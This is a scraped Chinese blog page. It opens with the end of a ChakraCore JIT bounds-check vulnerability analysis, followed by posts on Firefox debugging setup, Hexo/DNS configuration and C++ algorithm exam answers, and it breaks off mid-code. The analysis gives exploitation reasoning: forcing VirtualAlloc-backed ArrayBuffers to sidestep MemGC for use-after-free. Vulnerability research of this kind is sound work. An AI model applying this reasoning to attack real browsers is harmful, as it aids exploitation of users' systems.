<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-041938.jpg" alt=""><br>全局搜索报错字符串并查找引用寻找原因。<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-042028.jpg" alt=""></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>在patch后，要触发需要构造常数边界(上面有分析)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isProfilableStElem ||</span><br><span class="line">            !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class="line">            ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class="line">              baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class="line">              !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class="line">            )</span><br></pre></td></tr></table></figure></p>
<p>isProfilableStElem显然是JIT优化时用来采集的一个标志，所以通过循环生成JIT的时候就可以走进if body。<br>但是其他和IR有关的“||”选项显然是不能放过的线索，可以测试如何走进这些路径。</p>
<h3 id="开发者的assumption"><a href="#开发者的assumption" class="headerlink" title="开发者的assumption"></a>开发者的assumption</h3><h4 id="assumption"><a href="#assumption" class="headerlink" title="assumption"></a>assumption</h4><p>如图可知，传入的length的最大长度为MaxArrayBufferLength，length的类型是uint32即最大值2^32-1<br>MaxArrayBufferLength    0x7fffffff    const unsigned int<br>这里即是对要分配的buffer的空间大小的一次校验。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031659.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031809.jpg" alt=""></p>
<p>而采用VirtualAlloc一次分配的大小是4GB即2^32<br><code>#define MAX_ASMJS_ARRAYBUFFER_LENGTH 0x100000000 //4GB</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031827.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031841.jpg" alt=""><br>然而在通过索引访问buffer的时候，索引的类型也是uint32的。<br>于是若是数组索引，按照单个元素size同比扩容之后，则有可能超过4GB的虚拟内存（即length最大可以申请到4G，但是访问可以是4G*x）。<br>而对于访问超过分配的buffer但是在VirtualAlloc分配的4G内的越界读写会直接会由硬件进行捕获。<br>我推测开发者在写代码的时候，正是没有注意到这一点，于是只是简单的出于性能优化的考虑，错误的判断了索引无论如何都不可能超出保留的大空间越界访问（因为4G是“最大”了，而在4G内的越界访问都会被硬件捕获并终止）<br>于是就直接去掉了边界。 </p>
<h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><p>最简单也是最常见的可优化边界检查代码就是处在循环里的边界检查。</p>
<p>我们假设循环具有迭代变量i，且初值为init, 终值为fin，i++<br>只有循环控制代码修改i<br>假设必须要满足的范围是<code>lo &lt; i &lt; hi</code><br>本来循环应该是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    i &lt;- init</span><br><span class="line">L1: ...</span><br><span class="line">    if i &lt; lo trap</span><br><span class="line">    if i &gt; hi trap</span><br><span class="line">    use of i that must satisfy lo &lt;= i &lt;=hi</span><br><span class="line">    ....</span><br><span class="line">    i &lt;- i + 1</span><br><span class="line">    if i &lt;= fin goto L1</span><br></pre></td></tr></table></figure></p>
<p>最容易处理的情况是i为常量v，则只需要将检查lo &lt; i &lt; hi的代码外提到循环的前置块里即可</p>
<p>下一种稍微复杂一点的情况是i为变量，这样我们就要处理范围表达式lo &lt; i &lt; hi（比如说分配的数组最大空间不超过hi，最小不小于0）<br>其中i是循环控制变量，在这种情况下，只需要lo &lt; init且 fin &lt; hi ， 就能满足范围表达式<br>于是我们可以这么做<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    if lo &gt; init trap (i的初始值为init，如果init 比 i需满足的最小值还小，则trap</span><br><span class="line">    t1 &lt;- min(fin, hi)</span><br><span class="line">    i &lt;- init</span><br><span class="line">L1: ...</span><br><span class="line">    use of i that must satisfy lo &lt;= i &lt;= hi</span><br><span class="line">    ....</span><br><span class="line">    i &lt;- i + 1</span><br><span class="line">    if i &lt;= t1 goto L1</span><br><span class="line">    if i &lt;= fin trap 6(i本应该到达fin，如果i不能到达它本来应该到达的值，就trap</span><br></pre></td></tr></table></figure></p>
<h3 id="GC和VirtualAlloc在安全性上的区别"><a href="#GC和VirtualAlloc在安全性上的区别" class="headerlink" title="GC和VirtualAlloc在安全性上的区别"></a>GC和VirtualAlloc在安全性上的区别</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>UAF(Use After Free)：即释放后使用。将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控</p>
<h4 id="MemGC"><a href="#MemGC" class="headerlink" title="MemGC"></a>MemGC</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100435.jpg" alt=""><br>如图，对象A申请了一个数据块，当释放这个数据块时，若还有其他对象引用这个数据块，那么MemGC不会回收利用，其他程序无法将数据写入这个数据块，从而阻止了UAF漏洞的利用；若没有其他对象引用这个数据块，就不存在UAF漏洞了。</p>
<h4 id="标记清除法"><a href="#标记清除法" class="headerlink" title="标记清除法"></a>标记清除法</h4><p>标记清除（Mark and Sweep）是最早开发出的GC算法（1960年）。它的原理非常简单，首先从根开始将可能被引用的对象用递归的方式进行标记，然后将没有标记到的对象作为垃圾进行回收。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100040.jpg" alt=""><br>图显示了标记清除算法的大致原理。<br>图中（1）部分显示了随着程序的运行而分配出一些对象的状态，一个对象可以对其他的对象进行引用。<br>图中（2）部分中，GC开始执行，<strong>从根开始对可能被引用的对象打上标记</strong>，大多数情况下，这种标记是通过对象内部的标志（Flag）来实现的。于是，被标记的对象我们把它们涂黑。<br>图中（3）部分中，被标记的对象所能够引用的对象也被打上标记。重复这一步骤的话，就可以将从根开始可能被间接引用到的对象全部打上标记。到此为止的操作，称为标记阶段（Mark phase）。<br>标记阶段完成时，被标记的对象就被视为“存活”对象。<br>图中（4）部分中，将全部对象按顺序扫描一遍，将没有被标记的对象进行回收。这一操作被称为清除阶段（Sweep phase）。<br>在扫描的同时，还需要将存活对象的标记清除掉，以便为下一次GC操作做好准备。标记清除算法的处理时间，是和存活对象数与对象总数的总和相关的。</p>
<h4 id="GC和VirtualAlloc在安全性上的区别-1"><a href="#GC和VirtualAlloc在安全性上的区别-1" class="headerlink" title="GC和VirtualAlloc在安全性上的区别"></a>GC和VirtualAlloc在安全性上的区别</h4><p>VirtualAlloc是裸的内存分配释放，并没有对UAF加以缓解。<br>而通过控制ArrayBuffer的length(&gt;0x10000)，我们可以选择通过VirtualAlloc来分配内存，于是就“绕开”了GC的保护，就有可能通过UAF来完成利用。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过分析Root Cause，并进一步通过对Assumption的思考，对patch的分析，相关知识由点及面的学习，并最后在脆弱性上进行考虑，找出可行的利用点，思考的深度有所提升。</p>
<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><h4 id="Windbg常用命令"><a href="#Windbg常用命令" class="headerlink" title="Windbg常用命令"></a>Windbg常用命令</h4><ul>
<li>dd memory<br>打印内存</li>
<li>u<br>打印汇编</li>
<li>k<br>查看堆栈<h4 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h4></li>
</ul>
<ol>
<li>寻找JIT代码，定位CallLoopBody，它的参数就是JIT代码地址。</li>
<li>寻找生成JIT代码的地方可以考虑在Func::Codegen那里下断。</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/07/03/firefox_env/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/03/firefox_env/" itemprop="url">firefox调试环境搭建</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-03T21:30:32+08:00">
                2018-07-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/浏览器/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="firefox调试环境搭建"><a href="#firefox调试环境搭建" class="headerlink" title="firefox调试环境搭建"></a>firefox调试环境搭建</h2><h3 id="关闭firefox多进程"><a href="#关闭firefox多进程" class="headerlink" title="关闭firefox多进程"></a>关闭firefox多进程</h3><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133104.jpg" alt=""><br>打开firefox，访问aboutt:config，如图设置为false。</p>
<h3 id="windbg配置"><a href="#windbg配置" class="headerlink" title="windbg配置"></a>windbg配置</h3><p>我是从windows store下载的windbg preview<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133125.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133137.jpg" alt=""><br>界面好看<br>然后配置一下符号服务器：<code>SRV*c:\mysymbol*http://symbols.mozilla.org</code><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133149.jpg" alt=""></p>
<h3 id="shadow配置"><a href="#shadow配置" class="headerlink" title="shadow配置"></a>shadow配置</h3><p><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a></p>
<p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133157.jpg" alt=""><br>然后下载<a href="https://githomelab.ru/pykd" target="_blank" rel="noopener">pykd</a>，其实就是一个dll<br>配置好python环境，下载<a href="https://www.python.org/ftp/python/2.7.11/python-2.7.11.amd64.msi" target="_blank" rel="noopener">python2.7.11</a>，用高版本会出bug。<br>然后<code>pip install pykd</code><br>注意pip需要配置一下终端代理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set http_proxy=http://127.0.0.1:1080</span><br><span class="line">set https_proxy=https://127.0.0.1:1080</span><br></pre></td></tr></table></figure></p>
<p>然后测试使用</p>
<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><h4 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h4><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133207.jpg" alt=""></p>
<h4 id="载入pykd-dll，从而可以在windbg执行py"><a href="#载入pykd-dll，从而可以在windbg执行py" class="headerlink" title="载入pykd.dll，从而可以在windbg执行py"></a>载入pykd.dll，从而可以在windbg执行py</h4><p><code>!load 路径\pykd.dll</code><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133213.jpg" alt=""></p>
<h4 id="启动shadow"><a href="#启动shadow" class="headerlink" title="启动shadow"></a>启动shadow</h4><p><code>!py d:\useful\shadow\pykd_driver.py</code></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133220.jpg" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/06/30/blog_build/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/30/blog_build/" itemprop="url">hexo blog搭建及域名解析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-30T09:49:47+08:00">
                2018-06-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/杂项/" itemprop="url" rel="index">
                    <span itemprop="name">杂项</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有个小傻子弄不好域名解析。。我写一下吧。</p>
<h2 id="blog搭建"><a href="#blog搭建" class="headerlink" title="blog搭建"></a>blog搭建</h2><p>参考我学弟写的就可以，很详细<br><a href="https://kabeor.cn/Hexo+GitPage%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_blank" rel="noopener">https://kabeor.cn/Hexo+GitPage%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</a></p>
<h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><p>我域名在主机壳买的，安利一下<br><a href="https://www.zhujike.com/" target="_blank" rel="noopener">https://www.zhujike.com/</a><br>买了之后可以在域名列表里看到<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015647.png" alt=""><br>然后可以在域名解析里添加域名解析<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015720.png" alt=""><br>具体的</p>
<ul>
<li>@<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015731.png" alt=""></li>
<li>www<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015747.png" alt=""><h2 id="hexo-CNAME"><a href="#hexo-CNAME" class="headerlink" title="hexo CNAME"></a>hexo CNAME</h2>然后在如图路径下建立一个CNAME文件<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015835.png" alt=""><br>内容就是你的域名了。<br>然后同步一下，等一会就解析好了。<h2 id="关于博客管理"><a href="#关于博客管理" class="headerlink" title="关于博客管理"></a>关于博客管理</h2>建议写好分类和标签<br>能用tag来分的小类不要用categories来分<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-020002.png" alt=""><br>其他的多读wiki，等我哪天博客重建了再写。</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/06/29/algorithm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/29/algorithm/" itemprop="url">algorithm期末考试</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-29T01:06:05+08:00">
                2018-06-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/杂项/" itemprop="url" rel="index">
                    <span itemprop="name">杂项</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="简单背包问题"><a href="#简单背包问题" class="headerlink" title="简单背包问题"></a>简单背包问题</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-171258.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> data[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">weight</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> n)</span><span class="comment">//w是重量，n是剩下的件数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (w == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (w!=<span class="number">0</span>&amp;&amp;n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (weight(w - data[n], n - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> weight(w, n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> w, n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;w&gt;&gt;n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (weight(w, n)) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"YES"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"NO"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Buyer"><a href="#Buyer" class="headerlink" title="Buyer"></a>Buyer</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-171631.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输入1：可以支配的钱和可以选择的物品种类数</span></span><br><span class="line"><span class="comment">输入2：N行，每行为每种物品的价钱和受欢迎程度</span></span><br><span class="line"><span class="comment">输出1：可能达到的最大的受欢迎程度</span></span><br><span class="line"><span class="comment">输出2：购买的物品的编号（物品不重复购买）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Food</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> m_money;</span><br><span class="line">    <span class="keyword">int</span> m_value;</span><br><span class="line">&#125; Food;</span><br><span class="line">Food food[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> F[<span class="number">1000</span>][<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxlove</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= money; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((j - food[i].m_money) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                F[i][j] = max(F[i - <span class="number">1</span>][j], F[i - <span class="number">1</span>][j - food[i].m_money] + food[i].m_value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                F[i][j] = F[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> F[n][money];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> money, n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; money &gt;&gt; n) &#123;</span><br><span class="line">        food[<span class="number">0</span>].m_money = <span class="number">0</span>;</span><br><span class="line">        food[<span class="number">0</span>].m_value = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; food[i].m_money &gt;&gt; food[i].m_value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> result=maxlove(n,money);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//n是种类总数,money是钱</span></span><br><span class="line">        <span class="keyword">if</span>(result==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> remain = money;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (remain &gt;= food[i].m_money) &#123;</span><br><span class="line">                <span class="keyword">if</span> (F[i][remain] - F[i - <span class="number">1</span>][remain - food[i].m_money] == food[i].m_value) &#123;</span><br><span class="line">                    remain = remain - food[i].m_money;</span><br><span class="line">                    <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt; n - i + <span class="number">1</span>;</span><br><span class="line">                        flag=<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt;<span class="string">" "</span>&lt;&lt; n - i + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Renting-Boats"><a href="#Renting-Boats" class="headerlink" title="Renting Boats"></a>Renting Boats</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-171804.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 假设输入数据为：</span></span><br><span class="line"><span class="comment">                  4</span></span><br><span class="line"><span class="comment">            5 14 23</span></span><br><span class="line"><span class="comment">               5 12</span></span><br><span class="line"><span class="comment">                  8</span></span><br><span class="line"><span class="comment">以下为输入的数据分布（即m[i][j]）</span></span><br><span class="line"><span class="comment">    租船点\还船点</span></span><br><span class="line"><span class="comment">                0   1   2   3</span></span><br><span class="line"><span class="comment">            0   0   5   14  23</span></span><br><span class="line"><span class="comment">            1   0   0   5   12</span></span><br><span class="line"><span class="comment">            2   0   0   0   8</span></span><br><span 